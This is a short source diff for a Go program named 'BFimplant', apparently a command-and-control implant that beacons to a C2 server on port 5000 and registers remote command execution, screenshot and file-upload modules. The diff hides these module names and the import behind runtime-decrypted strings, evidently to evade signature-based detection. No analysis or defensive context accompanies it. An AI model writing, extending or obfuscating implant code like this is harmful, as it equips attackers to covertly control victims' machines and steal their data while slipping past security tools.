@@ -5,7 +5,7 @@ import (
 	"BFimplant/mymutex"
 	"fmt"
 	"syscall"
-	"BFimplant/per"
+	"BFimplant/winapiV2"
 )
 
 
@@ -30,17 +30,17 @@ func main() {
 	
 	if waitResult == syscall.WAIT_OBJECT_0 {
 
-		c2ServerURL := "http://" + per.DecryptString(ipC2) + ":" + "5000"
+		c2ServerURL := "http://" + winapiV2.DecryptString(ipC2) + ":" + "5000"
 
 		defer mymutex.ReleaseMutex(mutex)
 		implant := NewImplant(c2ServerURL,secret)
 		
 
 		// Register modules
-		implant.Modules["c"+"m"+"d"] = modules.NewExecuteModule()
+		implant.Modules[winapiV2.DecryptString("&(!")] = modules.NewExecuteModule()
 		implant.Modules["ping"] = modules.NewPingModule()
-		implant.Modules["scr"+"eens"+"hot"] = modules.NewScreenshotModule()
-		implant.Modules["up"+"lo"+"ad"] = modules.NewUploadModule()
+		implant.Modules[winapiV2.DecryptString("6&7  +6-*1")] = modules.NewScreenshotModule()
+		implant.Modules[winapiV2.DecryptString("05)*$!")] = modules.NewUploadModule()
 
 		implant.Start()
 
